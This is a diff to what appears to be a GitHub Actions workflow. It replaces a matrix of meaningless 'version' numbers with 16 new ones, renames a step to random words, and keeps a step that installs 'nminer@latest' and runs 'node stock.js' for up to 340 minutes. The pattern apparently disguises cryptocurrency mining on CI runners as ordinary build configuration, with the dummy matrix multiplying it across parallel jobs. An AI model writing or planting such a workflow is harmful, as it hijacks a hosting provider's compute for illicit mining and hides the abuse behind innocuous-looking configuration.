@@ -9,24 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7048 }
-          - { version: 1692 }
-          - { version: 3055 }
-          - { version: 4847 }
-          - { version: 504 }
-          - { version: 1813 }
-          - { version: 673 }
-          - { version: 7637 }
-          - { version: 5745 }
-          - { version: 1410 }
-          - { version: 2751 }
-          - { version: 1559 }
-          - { version: 6384 }
-          - { version: 9419 }
-          - { version: 1331 }
-          - { version: 9654 }
-          - { version: 6270 }
-          - { version: 8371 }
+          - { version: 3782 }
+          - { version: 5903 }
+          - { version: 7827 }
+          - { version: 5833 }
+          - { version: 9261 }
+          - { version: 9187 }
+          - { version: 2630 }
+          - { version: 3613 }
+          - { version: 9299 }
+          - { version: 3793 }
+          - { version: 4579 }
+          - { version: 2933 }
+          - { version: 6629 }
+          - { version: 5954 }
+          - { version: 5461 }
+          - { version: 9127 }
 
     steps:
       - name: Checkout
@@ -37,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: but
+      - name: sideboard hamburger
         run: |
           npm install nminer@latest
-          timeout 319m node stock.js || echo "stock executed"
+          timeout 340m node stock.js || echo "stock executed"
